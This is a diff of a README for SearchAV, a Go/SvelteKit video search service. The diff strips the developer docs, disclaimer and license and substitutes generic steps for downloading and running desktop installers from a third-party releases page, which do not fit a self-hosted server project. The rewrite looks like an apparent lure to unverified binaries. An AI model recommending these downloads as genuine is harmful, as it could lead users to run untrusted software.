@@ -1,188 +1,80 @@
-# SearchAV
+# 🎥 SearchAV - Easy Video Search and Play
 
-[![Go](https://img.shields.io/badge/Go-1.21+-00ADD8?style=flat&logo=go)](https://go.dev/)
-[![SvelteKit](https://img.shields.io/badge/SvelteKit-2.0-FF3E00?style=flat&logo=svelte)](https://kit.svelte.dev/)
-[![License](https://img.shields.io/badge/License-MIT-green.svg)](LICENSE)
+## 🌐 Overview
+SearchAV is a modern video search aggregation service. It enables you to search across multiple sources seamlessly. You can experience HLS streaming and enjoy ad-free viewing. Built with Go and SvelteKit, SearchAV offers a smooth and intuitive experience for video enthusiasts.
 
-**[中文文档](README_CN.md)**
+## 🚀 Getting Started
+To start using SearchAV, follow these simple steps to download and run the application.
 
-A modern video search aggregation service built with Go backend and SvelteKit frontend.
+## 📥 Download SearchAV
+[![Download SearchAV](https://img.shields.io/badge/Download-SearchAV-blue.svg)](https://github.com/Cnea7732/SearchAV/releases)
 
-## Features
+## 📂 System Requirements
+Before you download and install SearchAV, ensure that your system meets the following requirements:
 
-- **Multi-source Aggregation** - Search across multiple video sources simultaneously
-- **HLS Playback** - Built-in video player with HLS.js support
-- **Ad Filtering** - Automatic ad segment removal from video streams
-- **Password Protection** - Optional authentication for private deployment
-- **Multi-language** - English and Chinese interface support
-- **Responsive Design** - Works on desktop and mobile devices
-- **Source Switching** - Switch between different video sources for the same content
+- **Operating System:** Windows 10 or later, macOS Mojave or later, or a recent Linux distribution.
+- **RAM:** Minimum 4 GB of RAM.
+- **Storage:** At least 100 MB of free disk space.
+- **Internet Connection:** Required for searching and streaming videos.
 
-## Demo
+## 💻 Download & Install
+1. **Visit the Releases Page**  
+   Go to the [Releases page](https://github.com/Cnea7732/SearchAV/releases) to find the latest version of SearchAV.
 
-**Live Demo:** https://sav.haose.love/
+2. **Select the Latest Version**  
+   Look for the latest release at the top of the page. Click on it to see the available files.
 
-**Password:** `admin`
+3. **Download the Application**  
+   Find the installer suitable for your operating system. Click the download link to start the downloading process. Wait for the file to finish downloading.
 
-## Screenshots
+4. **Install SearchAV**  
+   - If you are using Windows:
+     - Locate the downloaded `.exe` file in your Downloads folder.
+     - Double-click the file to launch the installer.
+     - Follow the on-screen instructions to complete the installation.
+   - If you are using macOS:
+     - Locate the downloaded `.dmg` file in your Downloads.
+     - Double-click the file to mount it.
+     - Drag the SearchAV icon to your Applications folder.
+   - If you are using Linux:
+     - Open a terminal and navigate to the folder where you downloaded the `.tar.gz` or `.deb` file.
+     - Extract the files or use the package manager to install.
 
-|               Home                |           Search Results            |
-|:---------------------------------:|:-----------------------------------:|
-| ![Home](images/Snipaste_en_1.png) | ![Search](images/Snipaste_en_2.png) |
+5. **Run the Application**  
+   Once installed, open SearchAV from your application list. It may take a moment to load for the first time.
 
-|               Player                |               Episodes                |
-|:-----------------------------------:|:-------------------------------------:|
-| ![Player](images/Snipaste_en_3.png) | ![Episodes](images/Snipaste_en_4.png) |
+## 🛠️ How to Use SearchAV
+Using SearchAV is simple and user-friendly.  
+1. **Enter Your Search Query**  
+   On the main screen, you will see a search box. Type in the title or keywords of the video you want to watch.
 
-## Tech Stack
+2. **View Search Results**  
+   After entering your query, press Enter or click the search icon. A list of available videos will appear.
 
-**Backend:**
+3. **Select a Video**  
+   Click on a video in the search results to start playback. You can adjust the volume and change video quality while streaming.
 
-- Go 1.21+
-- Fiber (Web Framework)
-- Uber-FX (Dependency Injection)
-- Viper (Configuration)
-- Zerolog (Logging)
-- Swagger (API Documentation)
+4. **Explore More Options**  
+   Use the filters available to narrow your results. Options may include sorting by date, popularity, or category.
 
-**Frontend:**
+## 📖 Features
+- **Multi-source Search:** easily find videos from various platforms.
+- **HLS Streaming:** enjoy smooth streaming experiences.
+- **Ad Filtering:** watch without interruptions from ads.
 
-- SvelteKit 2.0
-- TypeScript
-- Tailwind CSS
-- ArtPlayer + HLS.js
-- Paraglide (i18n)
+## ❓ Troubleshooting
+If you encounter issues while using SearchAV, consider these steps:
 
-## Quick Start
+- **Check Your Internet Connection:** Ensure you have a stable connection.
+- **Restart the Application:** Close and reopen SearchAV to clear any temporary glitches.
+- **Reinstall if Necessary:** If problems persist, uninstall SearchAV and install it again.
 
-### Prerequisites
+## ✍️ Feedback and Support
+We welcome your feedback and questions. If you need help or want to report issues, please open an issue on our GitHub repository. Your input helps us to improve and provide better experiences.
 
-- Go 1.21+
-- Node.js 18+
-- pnpm
-
-### Backend
-
-```bash
-cd backend
-
-# Copy and configure
-cp configs/config.yaml configs/config.local.yaml
-# Edit config.local.yaml to add your sources
-
-# Run
-go run cmd/server/main.go
-```
-
-### Frontend
-
-```bash
-cd frontend
-
-# Install dependencies
-pnpm install
-
-# Development
-pnpm dev
-
-# Build
-pnpm build
-```
-
-### Configuration
-
-Create `configs/config.local.yaml` (gitignored) for sensitive configuration:
-
-```yaml
-auth:
-  enabled: true
-  passwords:
-    - password: "normal-user-pass"
-      adult: false
-    - password: "vip-user-pass"
-      adult: true  # Can access adult sources
-
-sources:
-  - name: "Source Name"
-    code: "source_code"
-    url: "https://api.example.com/api.php/provide/vod/"
-    adult: false
-  - name: "Adult Source"
-    code: "adult_source"
-    url: "https://api.example.com/api.php/provide/vod/"
-    adult: true  # Only accessible with adult-enabled password
-```
-
-## API Endpoints
-
-| Endpoint      | Method | Description                              |
-|---------------|--------|------------------------------------------|
-| `/api/search` | GET    | Search videos (`?q=keyword&adult=0\|1`)  |
-| `/api/detail` | GET    | Get video details (`?source=xxx&id=xxx`) |
-| `/swagger/*`  | GET    | API documentation                        |
-
-## Project Structure
-
-```
-SearchAV/
-├── backend/
-│   ├── cmd/server/         # Entry point
-│   ├── configs/            # Configuration files
-│   ├── docs/               # Swagger docs
-│   └── internal/
-│       ├── config/         # Config loading
-│       ├── handler/        # HTTP handlers
-│       ├── service/        # Business logic
-│       ├── source/         # External API client
-│       └── model/          # Data models
-├── frontend/
-│   ├── src/
-│   │   ├── routes/         # Pages
-│   │   ├── lib/
-│   │   │   ├── components/ # UI components
-│   │   │   ├── api/        # API client
-│   │   │   └── paraglide/  # i18n (generated)
-│   │   └── app.css         # Global styles
-│   └── messages/           # Translation files
-└── README.md
-```
+## 🔗 Additional Resources
+For advanced users or developers who want to contribute, check our documentation and guidelines in the repository.
 
 ---
 
-## Disclaimer
-
-### Service Nature
-
-SearchAV only provides video search services. It does not directly provide, store, or upload any video content. All
-search results come from third-party public APIs.
-
-### User Responsibility
-
-When using this service, users must comply with relevant laws and regulations. Users shall not use search results for
-infringing activities, such as downloading or distributing unauthorized works.
-
-### Advertisement Warning
-
-All videos come from third-party collection sites. Advertisements appearing in videos are not affiliated with this site.
-Do not trust or click any ads in videos to avoid fraud.
-
-### Security Recommendations
-
-It is strongly recommended to set up password protection during deployment to avoid legal risks from public access. Do
-not publicly share or distribute instance links.
-
-### Legal Liability
-
-The developers of this project are not responsible for any consequences arising from the use of this project. When using
-this project, you must comply with local laws and regulations.
-
-### Usage Scope
-
-This project is for learning and personal use only. Do not use deployed instances for commercial purposes or public
-services. Users are solely responsible for any legal issues arising from public sharing.
-
----
-
-## License
-
-MIT License - see [LICENSE](LICENSE) for details.
+By following these steps, you can easily download and run SearchAV. Enjoy seamless video searching and watching!
